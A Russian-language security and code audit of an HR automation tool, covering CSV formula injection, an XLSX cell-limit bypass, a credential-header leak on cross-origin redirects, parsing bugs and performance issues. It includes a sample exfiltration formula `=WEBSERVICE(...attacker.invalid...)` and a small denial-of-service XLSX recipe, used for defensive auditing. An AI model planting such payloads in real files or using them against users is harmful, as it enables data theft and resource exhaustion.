## Подтверждённые проблемы безопасности

### S1 · P2 · Формулы из вакансии попадают в CSV без обезвреживания

**Код:** [экспорт shortlist](/Users/admin/Documents/HR-Automation/src/job_intake/storage/repository.py:505), [описание вакансии](/Users/admin/Documents/HR-Automation/src/job_intake/storage/repository.py:548).

`export_shortlisted_csv` записывает недоверенные company/title/description непосредственно через `csv.DictWriter`. Синтетический заголовок `=WEBSERVICE("https://attacker.invalid/"&B2)` сохраняется в экспортированном поле как формула. Кавычки CSV не переводят значение в безопасный тип ячейки. Экспорт CRM уже содержит защиту от формульных префиксов, поэтому два экспорта применяют разные правила.

**Последствие:** при открытии файла подходящим табличным редактором возможны выполнение нежелательных формул и, для поддерживаемых функций, передача данных. Условия зависят от редактора, версии и настроек; утечка на реальном редакторе не демонстрировалась. Именно `WEBSERVICE` не возвращает результат в Excel для Mac — это ограничение примера, а не доказательство безопасности всего CSV. См. [OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection) и [Microsoft WEBSERVICE](https://support.microsoft.com/en-us/excel/functions/webservice-function).

**Исправление:** единая политика для всех экспортов, нейтрализация недоверенных текстовых полей и проверка в целевом редакторе. Альтернатива — XLSX с явно текстовыми ячейками. Не считать экранирование апострофом универсальной гарантией после повторного сохранения файла.

**Проверка:** `hr-security-edbe69e-repro.py`.

### S2 · P2 · Диапазоны гиперссылок XLSX обходят лимит количества ячеек

**Код:** [создание ячеек для hyperlink range](/Users/admin/Documents/HR-Automation/src/job_intake/crm/xlsx_reader.py:184), [учёт только XML-элементов c](/Users/admin/Documents/HR-Automation/src/job_intake/crm/xlsx_reader.py:151).

Счётчик `MAX_CELLS = 100000` применяется к явно заданным `<c>` в листе. Затем диапазон гиперссылки создаёт дополнительные `Cell`, не увеличивая этот счётчик. Синтетический файл размером **1339 байт** с 20 диапазонами `A1:A10000` … `T1:T10000` создаёт **200000 ячеек** и проходит этот ограничитель.

**Последствие:** пользовательский импорт маленького вредоносного XLSX может потребить большое количество памяти/CPU до проверки совместимости книги, включая dry-run. Не подтверждён сценарий неавторизованной удалённой атаки на CRM.

**Исправление:** общий бюджет материализованных ячеек и работы с диапазонами, проверка до разворачивания, ограничение числа листов и повторных ссылок на один worksheet part. По возможности не создавать пустые ячейки только ради hyperlink.

**Проверка:** `hr-security-edbe69e-repro.py`.

## Подтверждённые функциональные баги

### B1 · P2 · Удаление переносов строки переносит отрицание на соседнее требование

**Код:** [сборка текста через compact_text](/Users/admin/Documents/HR-Automation/src/job_intake/filtering.py:235).

Описание:

```text
No sponsorship provided
US work authorization required
```

После локальной разметки, фильтрации, применения annotation constraints и scoring вакансия получает **PASS / A / 20**, без blockers. Если поставить точку после первой строки, тот же пример получает **REJECT / C / 0**. Удаление переносов склеивает самостоятельные утверждения, и отрицание первого подавляет проверку второго.

**Последствие:** обязательное право на работу в США пропускается. **Исправление:** сохранить границы исходных утверждений и ограничивать действие отрицания одним утверждением, не всем компактным текстом.

**Проверка:** `audit_annotation_repro.py`.

### B2 · P2 · Сокращение U.S. ломает обнаружение права на работу в США

**Код:** [разбиение утверждений по каждой точке](/Users/admin/Documents/HR-Automation/src/job_intake/annotation/text.py:318).

**Последствие:** смысл одинакового ограничения зависит от написания US/U.S. **Исправление:** не разбивать известные сокращения на предложения либо сначала сопоставлять фразу с исходным source unit, а затем определять её модальность.

**Проверка:** `audit_annotation_repro.py`.

### B3 · P2 · Вопрос о языке работы становится жёстким отказом

## Измеренная неоптимальность скорости и кода

Обозначения O1–O7 ниже — находки по производительности; P2/P3 обозначают приоритет, а не номера пунктов.

### O1 · P2 · N+1 запросы в CRM state

**Код:** [сериализация приложений](/Users/admin/Documents/HR-Automation/src/job_intake/crm/server.py:264), [оценки вакансий](/Users/admin/Documents/HR-Automation/src/job_intake/crm/server.py:275), [история/контакты](/Users/admin/Documents/HR-Automation/src/job_intake/crm/repository.py:124).

Для 1000 вакансий и 1000 приложений, у каждого одна запись истории и нет контактов, state выполняет **3006 SELECT**: фиксированная часть плюс один на оценки каждой вакансии и два на отношения каждого приложения. Подмена загрузки на `selectinload` в синтетической проверке снижает число до **16 SELECT**. Медиана пяти прогонов state + JSON без tracemalloc: **0,3371 с → 0,1438 с** на SQLite в памяти.

**Рекомендация:** явная пакетная загрузка нужных отношений, отдельная загрузка подробностей карточки. Считать число SQL-запросов при проверке, а не только время маленькой тестовой базы.

**Проверки:** `hr_audit_perf.py`, `hr_audit_eager.py`.

### O2 · P2 · Полный state с описаниями и разметкой перезагружается после каждого изменения

**Код:** [description и annotation в списке](/Users/admin/Documents/HR-Automation/src/job_intake/crm/server.py:305), [обновление всего state после mutation](/Users/admin/Documents/HR-Automation/src/job_intake/crm/index.html:334).

Данные подробностей передаются и при работе с другими вкладками, затем загружаются заново после небольшого изменения.

**Рекомендация:** компактный список с пагинацией, детали по запросу, отдельные endpoints/read models для приложений/контактов/компаний; mutation возвращает изменённую сущность и затронутые метрики.

**Проверка:** `hr_audit_perf.py`. Это synthetic payload, не размер текущей пользовательской базы.

## Условный риск безопасности, требующий проверки конфигурации

### C1 · P2 при наличии секретных custom headers · Заголовки передаются при redirect на другой origin

**Код:** [обычный Session.get](/Users/admin/Documents/HR-Automation/src/job_intake/utils/http.py:40).

Requests автоматически следует redirect. В проверке с in-memory HTTP adapter ответ 302 переносит синтетический `X-API-Key` с `source.invalid` на `attacker.invalid`. Пользовательские конфигурации `source.params.headers` не проверялись: наличие реального секрета в этом пути не установлено.

**Условие эксплуатации:** источник использует секретный нестандартный заголовок и отвечает redirect на чужой origin. Проверка не доказывает утечку действующего ключа. Ограничения redirect в DailyRemote cookie adapter и annotation API не следует считать отсутствующими: у этих путей есть отдельная защита.

**Рекомендация:** привязывать credentials к origin и проверять redirect до отправки следующего запроса, отбрасывать секретные custom headers при смене origin.

**Проверка:** `hr-security-edbe69e-repro.py`.

## Неоптимальность структуры кода

Это причины уже перечисленных проблем, а не дополнительные пункты к числу находок.

1. **Разные правила понимания одного ограничения.** Структурированные поля, прямые regex и source-grounded claims неодинаково проверяют утверждение, отрицание, вопрос, альтернативу и исключение. Это основа B1–B5. Нужен общий результат интерпретации условия и единая политика PASS/REVIEW/REJECT для всех путей.
2. **Неодинаковые правила сохранения CRM.** Приложения и контакты используют версии, компании — нет; интерфейс принимает дату/заметку этапа, репозиторий может молча игнорировать их. Нужны явные контракты mutation и проверки конкурентных изменений, B7–B8.
3. **Один state связывает список, подробности и все сущности.** Отсюда скрытый лимит B9, N+1 O1 и большой повторяемый payload O2. Нужны ограниченные read models и серверные запросы с пагинацией.
4. **Жизненный цикл AI-задачи не выражен явно.** Ошибка annotation не участвует в статусе run; pending batch может быть отброшен; удалённая задача теряется после timeout. Нужны сохранённые состояния задачи и явный контракт «завершено / частично / ожидает / ошибка», B6/B10/B11.
5. **Подготовка данных повторяется внутри профильного цикла.** Парсинг исходного текста и поиск кеша можно выполнить до цикла, O4/O5. Это уменьшит время и число расхождений между профилями.

## Порядок исправлений

1. **Безопасность файлов и точность допуска:** S1/S2 и B1–B5. Добавить регрессионные случаи с переносами, U.S., вопросами, альтернативами remote/hybrid и `except Brazil`; проверить одинаковый результат прямого фильтра и annotation constraints.
2. **Доступность и сохранность данных CRM:** B7–B9 совместно с O1/O2. Сначала серверные фильтры/пагинация и корректные mutation, затем интерфейс и пакетная загрузка.
3. **Надёжность автоматизации и AI:** B6/B10/B11; долговечное состояние batch и проверка выхода CLI. C1 проверить при настройке источников с confidential headers.
4. **Скорость при росте базы:** O3–O7. Оптимизировать по числу запросов и объёму записи, сохраняя сортировку, актуальность profile evaluations, resume и связи CRM.
